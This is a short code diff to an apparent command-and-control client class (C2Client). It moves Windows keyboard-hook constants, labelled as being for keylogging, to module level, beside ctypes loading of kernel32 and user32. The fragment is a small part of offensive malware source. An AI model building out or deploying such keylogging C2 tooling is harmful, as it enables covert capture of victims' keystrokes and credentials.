@@ -17,6 +17,11 @@ from .encryption_manager import EncryptionManager
 
 logger = logging.getLogger(__name__)
 
+# Windows API constants for keylogging
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN = 0x0100
+HC_ACTION = 0
+
 
 class C2Client(BaseC2):
     """
@@ -647,11 +652,6 @@ class C2Client(BaseC2):
                         import ctypes
                         import threading
                         from ctypes import wintypes
-
-                        # Windows API constants
-                        WH_KEYBOARD_LL = 13
-                        WM_KEYDOWN = 0x0100
-                        HC_ACTION = 0
 
                         kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                         user32 = ctypes.WinDLL('user32', use_last_error=True)
